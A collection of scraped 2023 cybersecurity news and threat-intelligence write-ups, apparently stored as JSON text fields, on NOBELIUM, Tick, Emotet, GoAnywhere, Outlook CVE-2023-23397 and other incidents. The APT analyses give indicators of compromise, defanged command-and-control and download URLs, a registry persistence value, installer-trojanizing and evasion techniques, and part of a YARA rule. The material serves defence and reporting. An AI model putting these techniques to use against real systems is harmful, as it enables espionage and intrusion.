Arabic-speaking Android users."

      "text": " NOBELIUM, aka APT29, is a sophisticated, Russian state-sponsored threat actor targeting Western countries. At the beginning of March, BlackBerry researchers observed a new campaign targeting European Union countries; specifically, its diplomatic entities and systems transmitting sensitive information about the region's politics, aiding Ukrainian citizens fleeing the country, and providing help to the government of Ukraine.TacticTechniqueResource DevelopmentT1584.006 (Compromising legitimate web servers to spread downloaders)Initial Access T1566.002 (Spear-phishing email with link to malicious website)ExecutionT1204.002 (Malicious .lnk files inside of weaponized ISO images)PersistenceT1547.001 (Execution through Autorun)Defense EvasionT1027.006 (Malicious HTML obfuscation)Command-and-ControlT1102.002 (Communicating via Notion API)WeaponsObfuscated html files, iso files, .lnk files, DLL 64 bitsAttack VectorSpear-phishingNetwork InfrastructureCompromised legitimate websites.TargetsDiplomatic entitiesContextThe infection vector for this particular campaign is a targeted phishing email containing a weaponized document. The malicious document includes a link leading to the download of an HTML file.The weaponized URLs shown above are hosted on a legitimate online library website based in El Salvador in Central America. We believe that the threat actor compromised this website sometime between the end of January 2023 and the beginning of February 2023.Figure 1: Visual lure masquerading as the Polish Ministry of Foreign AffairsFigure 2: Visual lure masquerading as the European CommissionThe HTML file delivered in this campaign contains a data block that can be decoded by subtracting 4. Upon decoding that data, we find that it has an “.ISO” file inside.Figure 3: Contents of the weaponized HTML fileThe “hxxps[:]//literaturaelsalvador[.]com/Instructions[.]html” link drops “Instruction.iso”, and the “hxxps[:]//literaturaelsalvador[.]com/Schedule[.]html” link drops “Schedule.iso”.

Some of the those decrypted strings are as follows:Continuing with its execution, a new directory is created under “C:\\Users\\<username>\\AppData”, where the BugSplatRc64.dll is copied over.To remain persistent on the infected system, a new registry key is created under: “HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DsDiBacks”, with the value of “C:\\Windows\\System32\\rundll32.exe \"C:\\Users\\<username>\\AppData\\Local\\DsDiBacks\\BugSplatRc64.dll,InitiateDs”.The BugSplatRc64.dll file aims to collect and exfiltrate information about the infected system. That includes basic data such as the owner’s username and IP address. This information is then used to create the victim’s unique identifier, which it then sends to the command-and-control (C2) server, Notion, which we’ll go into more detail on below.Every minute (62000ms), the BugSplatRc64.dll connects to the Notion server, waiting for the next payload. If successful, the payload is executed as a shellcode in the memory of its process.This campaign's malware delivery is based on the use of legacy network infrastructure that has been compromised by the threat actor. Using a compromised legitimate server to host the packed malware payload increases the chances of a successful installation on the victims’ machines.The packed malware utilizes \"api.notion.com\" for its C2 communication. \"Notion\" is a commonly used note-taking application. By using Notion’s application programming interface (API) for C2, the threat group are giving their traffic a benign guise.NOBELIUM has a history of utilizing compromised C2 servers, such as those hosted in the Microsoft® Azure® cloud infrastructure, to make their malicious C2’s look legitimate. Notion was also used during their November 2022 campaign, further aligning this campaign’s tactics, techniques and procedures (TTPs) with APT29.Figure 4: Notion C2 POST method exampleBased on the current geopolitical situation involving Russia’s invasion of Ukraine, the visit of Poland's Ambassador to the United States and his talk about the war, and the abuse of the online system used to exchange documents inside the European Union, we believe the target of NOBELIUM’s campaign is Western countries, especially those in Western Europe, which provide help to Ukraine.NOBELIUM actively collects intelligence information about the countries supporting Ukraine in the Russian-Ukraine war. The overlap between Poland's Ambassador’s visit to the United States with the lure used in the attacks, provides evidence that the threat actors carefully follow geopolitical events and use them to increase their possibility of a successful infection.Furthermore, our initial analysis of weaponized LNK files shows that the threat actor behind this campaign used anti-forensic techniques to wipe out personal metadata to remove information connected to its operations systems.Using compromised legitimate network infrastructure and a legitimate web server increases NOBELIUM’s technical capabilities to bypass basic network security mechanisms. However, an actionable Threat Intelligence model with counter-measure rules such as Suricata, will help to detect malicious traffic from the internal network to the threat actor’s network infrastructure.SHA256MD521a0b617431850a9ea2698515c277cbd95de4e59c493d0d8f194f3808eb1635467a6774fbc01eb838db364d4aa946a98SHA256MD5505f1e5aed542e8bfdb0052bbe8d3a2a9b08fc66ae49efbc9d9188a44c3870edE693777A3A85583A1BBBD569415BE09CSHA256MD5c1ebaee855b5d9b67657f45d6d764f3c1e46c1fa6214329a3b51d14eba33625689f716d32461880cd0359ffbb902f06eSHA256MD5dbb39c2f143265ad86946d1c016226b0e01614af35a2c666afa44ac43b76b276e0cb8157e6791390463714b38158195aSHA256MD5e957326b2167fa7ccd508cbf531779a28bfce75eb2635ab81826a522979aeb98cf36bf564fbb7d5ec4cec9b0f185f6c9SHA256MD53a489ef91058620951cb185ec548b67f2b8d047e6fdb7638645ec092fc89a8358d5c0f69c1caa29f8990fbc440ab3388SHA256MD54d92a4cecb62d237647a20d2cdfd944d5a29c1a14b274d729e9c8ccca1f0b68b82ecb8474efe5fedcb8f57b8aafa93d2IP108[.]167.180[.]186URLhxxps[:]//literaturaelsalvador[.]com/Instructions[.]htmlURLhxxps[:]//literaturaelsalvador[.]com/Schedule[.]htmlSHA256MD5dffaefaabbcf6da029f927e67e38c0d1e6271bf998040cfd6d8c50a4eff639df38b05aa4b5ba651ba95f7173c5145270Yara Rulesrule NOBELIUM_SpyDLL_March2023\r\n{\r\n                meta:\r\n                                copyright = \"BlackBerry\"\r\n                                description = \"Yara rule based on code NOBELIUM_SpyDLL_March2023\"\r\n                                author = \"BlackBerry Threat Intelligence Team\"\r\n                                date = \"2023-03-07\"\r\n                                sha256 =  \"e957326b2167fa7ccd508cbf531779a28bfce75eb2635ab81826a522979aeb98\"\r\n                                sha256 =  \"4d92a4cecb62d237647a20d2cdfd944d5a29c1a14b274d729e9c8ccca1f0b68b\"     \r\n                                sha256 =  \"3a489ef91058620951cb185ec548b67f2b8d047e6fdb7638645ec092fc89a835\"\r\n                strings:                                                                $1807379073_247 = { 8B ?? ?? ?? ?? ?? ?? 48 ?? ?? ?? ?? 48 ?? ?? ?? ??

      "text": "  The notorious trojan Emotet re-emerged this week after a three-month hiatus with a specific goal: send malicious emails to infiltrate high-value corporate networks and then try to sell that access to ransomware groups. “When the operator of the botnet sees a high value target infected, he can sell access to a ransomware group, which will have initial access and try to hack the whole network,” explained Kenin. “The return on investment is much higher for ransomware than banking trojans these days. For other less valuable targets, a method of pay-per-install can be used and the operator just loads other cybercriminals malware in bulk.”The initial attack file and the final payload are artificially inflated to more than 500 megabytes, a technique that can “drastically decrease” the chance of security products to block the file pre-execution, Deep Instinct reported about the new Emotet campaign.Kenin explained that the technique deployed by Emotet can cause serious performance issues for scanning big files from some vendors, or it can cause static detections to stop working properly and miss those files.“Solely based on the initial detections in VirusTotal, we could see that most vendors didn’t detect those files and it took them some tweaking to properly start detecting them,” said Kenin. “I would recommend security teams test the security product they use in a lab environment against the samples we provided to understand better how they are protected.”Emotet last appeared in November and June of 2022 and the Cofense researchers said it was unclear how long this attack period will last.The recent resurgence of Emotet, along with new modules and evasion techniques being added, indicates active development of the malware, said Zane Bond, head of product at Keeper Security.“It’s unlikely Emotet will become the world's top botnet as it was in the past, because the vulnerabilities that enabled its explosive growth have largely been patched,” said Bond. “However, it’s still a very capable adversary tool that defenders need to protect against. Without zero-days or critical vulnerabilities enabling a global widespread infection, adversaries are relying on common tactics to get initial footholds.”Malicious Python packages spread BlazeStealer malware Eight new Python packages masquerading as obfuscation tools have been used to facilitate the distribution of the BlazeStealer malware since January, The Hacker News reports.Hackread reports that Microsoft Azure's Automation Service has been leveraged to create the first cryptocurrency miner that could not be detected by security systems.Indian government organizations had their Windows and Linux systems subjected to two new attack campaigns by Pakistan-linked advanced persistent threat operation SideCopy, one of which involved the exploitation of a WinRAR security vulnerability, aimed at facilitating the deployment of various remote access trojans, The Hacker News reports.   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "The slow Tick-ing time bomb: Tick APT group compromise of a DLP software developer in East Asia",
      "text": " \n      Award-winning news, views, and insight from the ESET security community\n    \n        Award-winning news, views, and insight from the ESET security community\n      ESET ResearchESET Research uncovered a campaign by APT group Tick against a data-loss prevention company in East Asia and found a previously unreported tool used by the group\n14 Mar 2023\n • \n, \n16 min. read\nESET researchers discovered a campaign that we attribute with high confidence to the APT group Tick. The incident took place in the network of an East Asian company that develops data-loss prevention (DLP) software.The attackers compromised the DLP company’s internal update servers to deliver malware inside the software developer’s network, and trojanized installers of legitimate tools used by the company, which eventually resulted in the execution of malware on the computers of the company’s customers.Based on Tick’s profile, and the compromised company’s high-value customer portfolio, the objective of the attack was most likely cyberespionage. How the data-loss prevention company was initially compromised is unknown.\nKey points in this blogpost:\n\nESET researchers uncovered an attack occurring in the network of an East Asian data-loss prevention company with a customer portfolio that includes government and military entities.\nESET researchers attribute this attack with high confidence to the Tick APT group.\nThe attackers deployed at least three malware families and compromised update servers and tools used by the company. As a result, two of their customers were compromised.\nThe investigation revealed a previously undocumented downloader named ShadowPy.\n\nIn March 2021, through unknown means, attackers gained access to the network of an East Asian software developer company.The attackers also compromised update servers, which delivered malicious updates on two occasions to machines inside the network of the DLP company. Using ESET telemetry, we didn’t detect any other cases of malicious updates outside the DLP company’s network.The customer portfolio of the DLP company includes government and military entities, making the compromised company an especially attractive target for an APT group such as Tick.According to ESET telemetry, in March 2021 the attackers deployed malware to several machines of the software developer company. The malware included variants of the Netboy and Ghostdown families, and a previously undocumented downloader named ShadowPy.In April, the attackers began to introduce trojanized copies of the Q-dir installers in the network of the compromised company.In June and September 2021, in the network of the compromised company, the component that performs updates for the software developed by the compromised company downloaded a package that contained a malicious executable.In February and June 2022, the trojanized Q-dir installers were transferred via remote support tools to customers of the compromised company.Figure 1. Timeline of the attack and related incidents.The first incident where an update containing malware was registered was in June, and then again in September, 2021. On both cases the update was delivered to machines inside the DLP company’s network.The update came in the form of a ZIP archive that contained a malicious executable file. It was deployed and executed by a legitimate update agent from software developed by the compromised company. The chain of compromise is illustrated in Figure 2.Figure 2. Illustration of the chain of compromiseThe first detected case occurred in June 2021, and the update was downloaded from an internal server and deployed. The second case occurred in September 2021, from a public-facing server.The malicious executable issues an HTTP GET request to http://103.127.124[.]117/index.html to obtain the key to decrypt the embedded payload, which is encrypted with the RC6 algorithm. The payload is dropped to the %TEMP% directory with a random name and a .vbe extension, and is then executed.Using ESET telemetry, we didn’t identify any customers of the DLP company who had received any malicious files through the software developed by that company. Our hypothesis is that the attackers compromised the update servers to move laterally on the network, not to perform a supply-chain attack against external customers.Q-Dir is a legitimate application developed by SoftwareOK that allows its user to navigate four folders at the same time within the same window, as shown in Figure 3. We believe that the legitimate application is part of a toolkit used by employees of the compromised company, based on where the detections originated inside the network.Figure 3. Screenshot of the Q-Dir applicationAccording to ESET telemetry, starting in April 2021, two months before the detection of the malicious updates, the attackers began to introduce 32- and 64-bit trojanized installers of the application into the compromised company’s network.We found two cases, in February and June 2022, where the trojanized installers were transferred by the remote support tools helpU and ANYSUPPORT, to computers of two companies located in East Asia, one in the engineering vertical, and the other a manufacturing industry.These computers had software from the compromised company installed on them, and the trojanized Q-dir installer was received minutes after the support software was installed by the users.Our hypothesis is that the customers of the compromised DLP company were receiving technical support from that company, via one of those remote support applications and the malicious installer was used unknowingly to service the customers of the DLP company; it is unlikely that the attackers installed support tools to transfer the trojanized installers themselves.The technique used to trojanize the installer involves injecting shellcode into a cavity at the end of the Section Headers table – the application was compiled using 0x1000 for FileAlignment and SectionAlignment, leaving in a cavity of 0xD18 bytes – large enough to accommodate the malicious, position-independent shellcode. The entry point code of the application is patched with a JMP instruction that points to the shellcode, and is located right after the call to WinMain (Figure 4); therefore the malicious code is only executed after the application’s legitimate code finishes its execution.Figure 4. The assembly code shows the JMP instruction that diverts execution flow to the shellcode. The hexadecimal dump shows the shellcode at the end of the PE’s section headers.The shellcode, shown in Figure 5, downloads an unencrypted payload from http://softsrobot[.]com/index.html to %TEMP%\\ChromeUp.exe by default; if the file cannot be created, it gets a new name using the GetTempFileNameA API.Figure 5. Decompiled code of the function that orchestrates downloading the binary file and writing it to diskWhile only one malicious 32-bit installer was found, the 64-bit installers were detected in several places throughout the DLP company’s network. The installer contains the Q-Dir application and an encoded (VBE) ReVBShell backdoor that was customized by the attackers; both of them were compressed with LZO and encrypted with RC6. The files are dropped in the %TEMP% directory and executed.ReVBShell is an open-source backdoor with very basic capabilities. The backdoor code is written in VBScript and the controller code is written in Python. Communication with the server is over HTTP with GET and POST requests.The backdoor supports several commands, including:We believe that the attackers used ReVBShell version 1.0, based on the main branch commit history on GitHub.In this section, we provide more details about tools and malware families that Tick deployed in the compromised software company’s network.To maintain persistent access, the attackers deployed malicious loader DLLs along with legitimate signed applications vulnerable to DLL search-order hijacking. The purpose of these DLLs is to decode and inject a payload into a designated process (in all cases of this incident, all loaders were configured to inject into svchost.exe).The payload in each loader is one of three malware families: ShadowPy, Ghostdown, or Netboy. Figure 6 illustrates the loading process.Figure 6. High-level overview of the Tick malware loading processIn this report we will focus on analyzing the ShadowPy downloader and Netboy backdoor.Based on our findings, we believe the malware was developed at least two years before the compromise of the DLP company in 2021. We have not observed any other incidents where ShadowPy was deployed.As previously described, the malicious DLL loader is launched via DLL side-loading; in the case of ShadowPy we observed vssapi.dll being side-loaded by avshadow.exe, a legitimate software component from the Avira security software suite.The loading chain is illustrated in Figure 7.Figure 7. High-level overview of the steps taken to execute the PYC payloadThe PYC code is a simple downloader whose purpose is to retrieve a Python script and execute it in a new thread. This downloader randomly picks a URL from a list (although for the samples we analyzed only one URL was present) and builds a unique ID for the compromised machine by building a string composed of the following data:Finally, it uses abs(zlib.crc32(<STRING>)) to generate the value that will serve as an ID. The ID is inserted in the middle of a string composed of random characters and is further obfuscated, then it is appended to the URL as shown in Figure 8.Figure 8. Decompiled Python code that prepares the URL, appending the obfuscated unique user IDNetboy communicates with its C&C server over TCP. The packet format used to exchange information between the backdoor and its C&C is described in Figure 9.Figure 9. Illustration of the C&C packet format implemented by NetboyIn order to fingerprint its packets, it generates two random numbers (first two fields in the header) that are XORed together (as shown in Figure 10) to form a third value that is used to validate the packet.Figure 10. Decompiled code that generates two random numbers and combines them to generate a packet fingerprint valuePacket validation is shown in Figure 11, when the backdoor receives a new command from its controller.Figure 11. Decompiled code that performs validation of a newly received packetThe packet header also contains the size of the encrypted compressed data, and the size of the uncompressed data plus the size (DWORD) of another field containing a random number (not used for validation) that is prepended to the data before it is compressed, as shown in Figure 12.Figure 12. Decompiled code that creates a new packet to be sent to the controllerFor compression, Netboy uses a variant of the LZRW family of compression algorithms and for encryption it uses the RC4 algorithm with a 256-bit key made up of ASCII characters.Netboy supports 34 commands; however, in Table 1 we describe only 25 of the most prominent ones giving the attackers certain capabilities on the compromised systems.Table 1.

During the intrusion, the attackers deployed at least three malware families, and compromised update servers and tools used by the compromised company. As a result, two customers of the company were subsequently compromised.Our analysis of the malicious tools used during the attack revealed previously undocumented malware, which we named ShadowPy. Based on similarities in the malware found during the investigation, we have attributed the attack with high confidence to the Tick APT group, known for its cyberespionage operations targeting the APAC region.We would like to thank Cha Minseok from AhnLab for sharing information and samples during our research.\n\n\nSHA-1\nFilename\nESET detection name\nDescription\n\n\n\n\n72BDDEAD9B508597B75C1EE8BE970A7CA8EB85DC\ndwmapi.dll\nWin32/Netboy.A\nNetboy backdoor.\n\n\n8BC1F41A4DDF5CFF599570ED6645B706881BEEED\nvssapi.dll\nWin64/ShadowPy.A\nShadowPy downloader.\n\n\n4300938A4FD4190A47EDD0D333E26C8FE2C7451E\nN/A\nWin64/TrojanDropper.Agent.FU\nTrojanized Q‑dir installer, 64‑bit version.

      "text": " Cloud data management giant Rubrik confirmed that hackers attacked the company using a vulnerability in a popular file transfer tool.A spokesperson for the company told The Record that based on an investigation being carried out by a third party, the hackers did not access any data Rubrik secures on behalf of its customers.Using the widely-covered zero-day vulnerability affecting GoAnywhere, the hackers gained access to information in one of Rubrik’s non-production IT testing environments.“The current investigation has determined there was no lateral movement to other environments,” Mestrovich said. “Rubrik took the involved non-production environment offline and leveraged our own security systems and solutions to quickly contain the threat and help restore our test environment.”The data impacted by the incident is mostly internal sales information, including customer and partner names, business contacts, and a “limited number” of purchase orders from distributors, he said.The third party security firm investigating the incident said there was no sensitive personal data such as Social Security numbers, financial account numbers, or payment card numbers exposed in the servers accessed.Mestrovich noted that more than 100 organizations are being actively exploited through the GoAnywhere vulnerability.Fortra said last month that it is working with customers and the Cybersecurity and Infrastructure Security Agency (CISA) on a response to the spate of ransomware attacks targeting the zero-day, which is tracked as CVE-2023-0669.The company has faced significant backlash for being tight-lipped about the attacks on GoAnywhere – which is used by dozens of major companies and schools, including the University of Cincinnati, Think Mutual Bank, Nemours, University of Cincinnati and many local government offices.Fortra spent weeks only publishing private advisories about the issues in its customer portal but eventually told The Record that they first were made aware of attacks on GoAnywhere on January 30.Since then, the Clop ransomware group has continued to post victims on its leak site.File sharing platforms like GoAnywhere MFT are prime targets for nation-states and criminal hackers due to the data they might contain and their wide deployment across organizations.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " Credential-seeking cyberattackers garnered the most phishing success by impersonating the brands of telecommunications firms, financial institutions, and popular technology companies in 2022.That's according to an analysis of data collected by Internet services provider Cloudflare, which found that Individuals most often clicked on links in emails that appeared to come from AT&T and Verizon, PayPal and Wells Fargo, or Microsoft and Facebook. The rankings did not align with popularity — the Internal Revenue Service ranked No. 6 — but rather with the size of the brand's user base and the relative opportunity to turn compromise into cash, says Matthew Prince, CEO and co-founder of Cloudflare.\"We're seeing up and down the brand list, from the largest and most risky down to the smallest, that phishing is not going away as a problem,\" Prince says. \"Email still continues to be the No. 1 entry point for an attacker [and] phishing still continues to be the No. 1 threat for almost all of our customers.\"In addition, attackers are increasingly using phishing in an attempt to steal credentials from privileged employees and gain access to corporate networks, he says.Cloudflare used data from its domain name service (DNS) resolver to find the known phishing URLs that were most often visited by users, with visits to common hosting sites, such as Google and GoDaddy, removed from the data if the site could not be confirmed to be fraudulent.\"There are plenty of phishing scams where you might get something and say — 'Is this legitimate?' — so you might click on that link,\" he says. \"It's at least the start down a journey of success; it doesn't mean that somebody necessarily entered their credentials, or even, if they entered information, that they entered accurate information.\"The top-50 list represents typical targets of credential stealing campaigns, and while there is a significant difference in volume between the start and the end of the list, smaller companies and the much lower volume of phishing directed against their brands result in a very long tailed distribution, Prince says.Attackers tend to see phishing directed against brands in the top 50 as a way to steal money, packages, or valuable information from accounts, while the long-tail phishing tends to focus on gaining access for further compromise, Prince says. The first 10 companies on the list are AT&T, PayPal, Microsoft, DHL, Facebook, the IRS, Oath Holdings/Verizon, Mitsubishi UFJ NICOS, Adobe, and Amazon. The final five companies on the list are Banco Itaú Unibanco, Steam, Swisscom, LexisNexis, and Orange S.A.\"In most of these cases, when it's in the top-50 list, it's about how an attacker can gain access to an account to, in relatively short order, do something that generates cash for the attacker,\" he says. \"I think that when we look at some of the more targeted attacks, those [that] are much more about compromising systems, they then can be used more indirectly to launch some sort of attack.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

This could lead to exploitation BEFORE the email is viewed in the Preview Pane,\" Microsoft says in a security advisory published today.CVE-2023-23397 impacts all supported versions of Microsoft Outlook for Windows but doesn't affect Outlook for Android, iOS, or macOS versions.Additionally, since online services like Outlook on the web and Microsoft 365 do not support NTLM authentication, they are not vulnerable to attacks exploiting this NTLM relay vulnerability.Microsoft recommends immediately patching CVE-2023-23397 to mitigate this vulnerability to thwart any incoming attacks.The company also advises adding users to the Protected Users group in Active Directory and blocking outbound SMB (TCP port 445) if patching is not immediately possible, which might limit the impact of CVE-2023-23397.Microsoft urges customers to immediately patch their systems against CVE-2023-23397 or add users to the Protected Users group in Active Directory and block outbound SMB (TCP port 445) as a temporary mitigation to minimize the impact of the attacks.\"If required, admins can use this script to clean up the property for items that are malicious or even delete the items permanently.\"This script also allows modifying or deleting potentially malicious messages if they are found on the audited Exchange Server when run in Cleanup mode."

A number of the College’s systems have been impacted, including access to some files and resources.”Taylor added that the school “remains open as usual and our priority is to ensure continuity of educational provision. We anticipate some on-going disruption over the next couple of weeks, whilst we work to remedy the issues.”Wymondham is working with the National Cyber Security Centre (NCSC) “to ensure an appropriate response,” and has notified the Department for Education, said Taylor.He added that the school hadn’t received a ransom demand yet, although he wouldn’t be surprised if it developed that way. It was his understanding that a number of other schools in the U.K. had been affected in the last week.The alert page states that it has been updated several times since then due to further ransomware attacks.This preparation includes protecting IT networks but also focusing on a quick recovery from the incident itself.Alexander Martin is the UK Editor for Recorded Future News.

      "title": "Estonian official says parliamentary elections were targeted by cyberattacks",
      "text": " Estonia's parliamentary elections this month were unsuccessfully targeted by cyberattacks, one of the country's leading cybersecurity officials told The Record.Gert Auväärt, who heads the National Cyber Security Centre-Estonia (NCSC-EE), told The Record that his team had been in a “heightened awareness level for two weeks” during the campaign, and that attempts to enter the electoral system were unsuccessful.“There's no point in calling for a press conference and going and saying that this happened. Nothing out of the ordinary happened, nothing happened that hasn't happened the week before, or the week before that. We’ve been in sort of a cyber… I’m not going to use ‘war’, but we've been under a massive wave [of attacks] for a year now.“We went into a raised level — we have Alpha, Bravo, Charlie — so we went into Bravo last year in January and we haven't lowered it. We don’t know when we'll go back to green, to ‘all calm.’ It's not calm,” said Auväärt.He declined to offer a detailed description of the attacks, but he stressed that they weren’t successful. They covered a wide range of recognized threat actor behavior, he said.“We see now, the Russian attacks — actually, they are not attributed officially, so maybe I can’t say this so openly — but the attacks on our systems, we see that they are learning,” Kallas said. “They see that ‘OK, these things are not going through’ so they are improving and constantly trying new ways to really undermine our system.”Estonia is recognised among NATO allies as an authority on Russia. Its foreign intelligence service was praised highly by Sir Richard Moore, the chief of the U.K.’s MI6, at the Aspen Institute last year: “I mean, gosh, pound-for-pound [they] probably knock us into a cocked hat.”Despite almost a quarter of Estonia’s 1.3 million inhabitants being ethnic Russians, there is no significant sympathy for the invasion of Ukraine among its political parties.The Centre Party, historically the most popular among Russian-speaking Estonians, received 28% fewer votes than it received in the 2019 election. The main opposition party, the nationalist EKRE — which criticized military equipment being sent to Ukraine — also received fewer votes than before.\nThe exterior of the Riigikogu, or parliament of Estonia, in the capital Tallinn. Image: Scotch Mist / Wikimedia Commons / CC BY-SA 4.0NCSC-EE’s Auväärt said: “We are no different than any other country going through elections. Always there are attempts [at interference],” ranging from information operations to distributed-denial-of-service (DDoS) attacks and phishing campaigns.The attempts this month “didn't hinder or have any effect on the election process itself, either the paper balloting going on or the internet-based voting,” said Auväärt, adding that “attempts to break into the system and to try and manipulate it” were not just part of the election cycle, but “constant.”Estonia has faced “massive waves” of cyberattacks over the past year, he added, a period during which Estonia has provided more military equipment to Ukraine as a proportion of its GDP per capita than any other nation.Each of these waves followed a moment of political tension between Estonia and Russia, such as when Estonia’s Parliament decided to formally describe Russia as a terrorist state, and Ukrainian President Volodymyr Zelensky made a remote address to Estonia’s politicians.Back in 2007, just a few years after joining NATO, Estonia was impacted by a wave of cyberattacks when it relocated a Soviet war memorial from the center of the capital Tallinn to a military cemetery a few kilometers away. Officials blamed Russia for the incidents.The digital attempts to hobble the country were groundbreaking. They showed what a nation could face as a result of cyber hostilities and prompted a major research effort into cyberwarfare at NATO, eventually leading to the NATO Cooperative Cyber Defence Center of Excellence being founded in Tallinn in 2008.“Whatever daily business you conduct that irritates their worldview or their perception of things, immediately there is a response and the response usually is in this massive wave of DDoS attacks,” said Auväärt.DDoS attacks against Estonian government websites, including the parliamentary website and the president’s website, continued throughout the election, he said. These attacks attempted to take the websites offline by sending too many requests for the servers to handle, meaning authentic attempts to load the page went unanswered.While DDoS attacks can use different communications protocols to prevent a server from responding to legitimate requests, the Estonian incidents were typically application layer, or Layer 7, attacks — using HTTP requests (the type used to load a web browser page). While they were not technically sophisticated attacks, the scale was surprising, said Auväärt.“For the first quarter of last year, we were the seventh [most targeted country] on the planet. We’re a country of 1.3 million people, so like a suburb of London population-wise. If you put that into perspective then it shows the level of interest of some people who want to put the emphasis here [on Estonia] with their attacks,” he added.“It’s not the highest on the planet, but it’s just — to put it bluntly — it’s weird to want to try that much to get the system down. Where the moment of pride comes, of course, is in the fact that we maintained our systems up and running,” Auväärt added.Auväärt told The Record “there's more variety than just the two options that you listed,” regarding botnet or paid-infrastructure DDoS traffic.“We know who is behind them and we have the data to go down the rabbit hole and see where it originated. But we're not in the business of attribution,” he said. “It's not our goal first of all, and secondly, this is exactly what they're looking for: ‘Look what we did, look where we succeeded,’ so we don't specifically voice out publicly whoever it was.”Alexander Martin is the UK Editor for Recorded Future News.

The attackers have also demonstrated \"advanced capabilities,\" including reverse-engineering parts of the FortiGate devices' operating system.\"The attack is highly targeted, with some hints of preferred governmental or government-related targets,\" the company said.\"The exploit requires a deep understanding of FortiOS and the underlying hardware. Custom implants show that the actor has advanced capabilities, including reverse-engineering various parts of FortiOS.\""

Those documents had a date of death ranging from 1998 to 2023, with 90% occurring in 2014 or earlier, according to the department.Death certificates — which are required for settling financial and legal matters — are generated separately from death records, the department said.“The death records contain the decedent’s name, social security number, address, sex, date of birth, date of death, place of death, and cause of death. Records that had been certified could not be altered, and 99% of the records had been certified,” officials said.“DOH reviewed the 1% of records that had not been certified, and none were certified by the unauthorized user.”Breach notification letters will be sent to anyone listed in the EDRS system as a surviving spouse or person who reported the death to the mortuary.The compromised account belonged to a medical certifier who worked for a local hospital but left the job in June 2021. The person’s account had not been deactivated afterward.State officials said they plan to add more security measures for all external accounts connected to EDRS. They are in the process of reviewing all current external accounts.Jonathan Greig is a Breaking News Reporter at Recorded Future News. Jonathan has worked across the globe as a journalist since 2014.

      "text": " In the AT&T data breach, nine million user accounts were compromised after a third-party marketing partner was breached. As a result of the breach, customer data, including first names, account numbers, phone numbers, and email addresses, were exposed.Also disclosed were first names, wireless account numbers, wireless phone numbers, and email addresses, among other personally identifiable information. In some cases, the attack also had an impact on customer data, including monthly payment amounts, past-due sums, rate plans, monthly charges, and/or minutes spent.The wireless provider responded to a user who questioned the legitimacy of an email sent to consumers affected by a CPNI breach on their forum page (opens in a new tab) by acknowledging the security breach. A firm spokeswoman claims that, in accordance with the Federal Communications Commission, federal law enforcement has already been informed about CPNI’s improper access.The vulnerability has been patched, according to AT&T as well. This most recent hack is the first of its kind that AT&T has experienced in a long time and is evidence that Hackers constantly develop new techniques for committing fraud and identity theft.Cyberattacks in the telecom sector are on the rise, and numerous security researchers forecast that they will become a significant issue in 2023. This is especially true given the growing adoption of IoT devices, the push toward 5G, and the geopolitical context in which telecom companies serve as vital national infrastructure.Telecommunications businesses have already reported a number of cyber security problems within the first three months of the year. On January 6, a threat actor claimed to have discovered 37 million AT&T customer records on a third-party vendor’s insecure cloud storage. The threat actor distributed a sample of 5 million records.Citing a hack on a marketing vendor in January, AT&T is informing about 9 million customers that some of their personal data were made available. “Network Customer Proprietary The number of lines on some cellular accounts or wireless rate plans, for example, were made public, “According to AT&T. “There were no account passwords, Social Security Numbers, or other sensitive personal included in the data. Affected consumers are being informed.” Yet, AT&T informed BleepingComputer that “roughly 9 million wireless accounts had their Proprietary Customer Network Information exposed.”Despite the data breach letter not specifying the precise number of users affected. Customer-first names, wireless account numbers, wireless phone numbers, and email addresses are all included in the sensitive CPNI data. “A tiny portion of the consumers who were negatively impacted also had their rate plan name, past due balance, monthly payment amount, other monthly charges, and/or minutes spent exposed. The data was dated by several years, “ATT stated. The business also stated that its systems were unaffected by the vendor security problem and that the leaked data was mainly related to eligibility for device upgrades.Seeing AT&T experiencing a data breach involving a third-party company is a wakeup call for all businesses and highlights the need to revisit supply chains for security weak links. The fact that customer names, email addresses and phone numbers were amongst the leaked data, creates huge potential for tailored social engineering attacks and identity theft.\nSensitive information such as the customer data stolen in this attack is likely to be very valuable to organised criminals. Businesses of all sizes need to prioritise the security of critical and personal information, as you’re never too small or large to be a target. The key learning lesson here is making sure that not only are your own security processes up to scratch, but also that any third party dealing with sensitive data or accessing your network does so in the right way too.\nTo limit the impact of these attacks, businesses that hold private information should ensure they have clearly defined security policies and procedures to avoid any leak of information. This starts with employee education, which underscores all effective cyber resilience and data protection strategies. Security awareness training programmes can now inform and educate employees on the latest threats in real-time, including information security, social engineering, malware, and industry-specific compliance topics. Attack simulations can also be used to automatically send users for re-education should any training issues be identified.2020 Cybersecurity Landscape: 100+ Experts’ PredictionsCyber Security Predictions 2021: Experts’ ResponsesExperts’ Responses: Cyber Security Predictions 2023Celebrating Data Privacy Day – 28th January 2023Data Privacy Protection Day (Thursday 28th) – Experts Comments“Cybersecurity Awareness Month’s new evergreen theme \"Secure Our World” is…“Avoid storing data on personal devices: A crucial but often overlooked…“I recommend a new nuance to passwords that isn’t often…“In my role overseeing cloud environments and incident response, I'm…“​​Cybersecurity Awareness Month serves as a reminder to confront the…Information Security Buzz (aka ISBuzz News) is an independent resource that provides the experts comments, analysis and opinion on the latest Information Security news and topics "

After detecting an open port accepting connections, it will attempt to log in using hard-coded credentials.Once in, it deploys an IRC bot on compromised phpMyAdmin systems or a PHP web shell on servers running other targeted services.In the next phase of the attack, GoBruteforcer will reach out to its command-and-control server and wait for instructions that will be delivered via the previously installed IRC bot or web shell.​The botnet uses a multiscan module to find potential victims within a Classless Inter-Domain Routing (CIDR), granting it a broad selection of targets to infiltrate networks. Before scanning for IP addresses to attack, GoBruteforcer chooses a CIDR block and will target all IP addresses within that range.Rather than targeting a single IP, the malware uses CIDR block scanning for access to a diverse range of hosts on various IP addresses, increasing the reach of the attack.GoBruteforcer is likely under active development, with its operators expected to adapt their tactics and the malware's capabilities for targeting web servers and stay ahead of security defenses.\"We've seen this malware remotely deploy a variety of different types of malware as payloads, including coinminers,\" Unit42 added.\"We believe that GoBruteforcer is in active development, and as such, things like initial infection vectors or payloads could change in the near future.\""

